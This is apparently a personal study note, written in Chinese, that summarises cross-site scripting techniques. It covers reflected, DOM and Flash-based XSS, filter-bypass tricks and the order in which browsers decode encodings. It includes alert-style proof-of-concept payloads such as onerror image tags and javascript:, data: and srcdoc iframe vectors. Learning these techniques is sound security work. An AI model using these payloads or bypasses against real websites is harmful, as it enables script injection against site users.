#   反射形 XSS 总结

- ## 输出在`<script></script>`间
    - ### 首先判断，是否过滤了 `< , > , / `&emsp;等符号   
        没有的话可以直接xss
    - ### 尝试能否构成正确语法的xss
- ## 输出在`html属性`里
  - ### 如
    ```javascript
    <input value="输出"> 
    <img onload="...[输出]..."> 
    <body style="...[输出]...">
    ```
  - ### 如果没有过滤`\`可以通过`css`的`expresion()`进行执行某些操作：`expresion(eval(……))`====`expr\65ssion(\65val(……))`.其中的 `\65` 是 `e` 。
- ## 发生在`onxxxx="[输出]"`或者`href="javascript:[输出]"`的情况
  - ### 理论上讲，这两种情况与`<script>[输出]</script> `没有太大区别，但是有绕过方法。
  - <a href="#z">绕过方法见</a>
- ## 其他手段
  - ### 宽字节闭合`'`
  - ### 通过`\`来闭合后面的`'或者"`
  - ### 换行符`%0a`，如果我们的输出出现在注释中，可以通过换行符来把注释换行。

# DOM形XSS
- ## Dom Xss 相比反射型 XSS，我们要关注的不仅是[输出]了什么，还要了解这个页面里，[javascript]拿这个[输出]干了什么。
- ## DOM Xss 显示输出
  ```javascript
  document.getElementById("y").innerHTML="xxxxxxxxxx"; 
  document.write("xxxxxxxxxxxx");
  //或者jquery
  $("#y").html("xxxxxxx");
  ```
  这种情况下。xxxxx 只能使用 `<img src=1 onerror=alert(1)>` 这种方式来触发 JS   
  而不能以 `<script>alert(1)</script>` 来触发，因为这种压根不会执行`<script>..</script>`之间的内容。 
- ## DOM Xss 隐式输出
  - ### 通过审查找到输出？构造
  - ### 通过查找js代码
  - ### 显式输出和隐式输出。但是不论怎么样，因为最终 javascript 都会通过 `document.write` 或 `innerHTML` 将内 容输出到网页中，所以我们总是有办法看到输出到哪里
- ## DOM Xss eval
- ## DOM Xss frame
  - ### 有时候，输出还会出现在 `<iframe src="[输出]"></iframe>`
  - ### `<iframe onload="alert(1)"></iframe>`
  - ### `<iframe src="javascript:alert(1)"></iframe>`
  - ### IE 下 vbscript 执行代码
    `<iframe src="vbscript:msgbox(1)"></iframe>`
  - ###  Chrome 下 data 协议执行代码
    `<iframe src="data:text/html,<script>alert(1)</script>"></iframe> Chrome`
  - ### `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`
  - ### Chrome 下 srcdoc 属性
    `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
- ##  Dom Xss 路径 con #没懂
  - ### 用后面的参数覆盖了前面的参数……


# flash 型 XSS
- ###  `navigateToURL/getURL`会调用`url`,因此可以构造`getURL(javascript:alert(1))`
- ###  `ExternalInterface.call(js函数名,参数)`这个函数等同于`js函数名(参数)` 而 FLASH 里实际最后执行的 JS 代码，形式如下`try { flash toXML(函数名("参数 1")) ; } catch (e) { "<undefined/>"; }`,所以可以将函数名构造成:`(function(){alert("hi jack")})`

# 浏览器绕过
  - ##  chrome
  - 条件：`要求缺陷点，允许 < , > 。其次，要求缺陷点的后方存在 </script> 标签`


# 存储型 XSS















# <font id="z">xss标签编码解析</font>

## 1.  解析顺序

-  看标签包裹的顺序:
如： `<a href="javascript:alert(1)">`  
	先解析 html编码，然后url编码，然后js编码  

	所以编码的顺序：js编码 url编码 html编码

-   url编码时 ，你不能对协议类型进行任何的编码操作如：不能对 javascript:进行编码
   
-   HTML解析器能识别在<font color="blue">文本节点</font>和<font color="blue">参数值</font>里的实体编码
-   实体编码时，不可以破坏标签例如：
    -   `<img src="http://www.example.com">`
    -   `<&#115;cript>` 不可以;
    -   `<img src&# x3d;"http://www.example.com">`不可以;
    -   `<img s&# x72;c="http://www.example.com">`不可以;
  
    -   `<img src="ht&# x74;p&#x3a;//www.example.com">`可以



-  ` <textarea>`中的代码不会执行，可以考虑闭合
-   javascript中 括号（）必须用（）
    -  当Unicode转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。
    -   当Unicode转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。





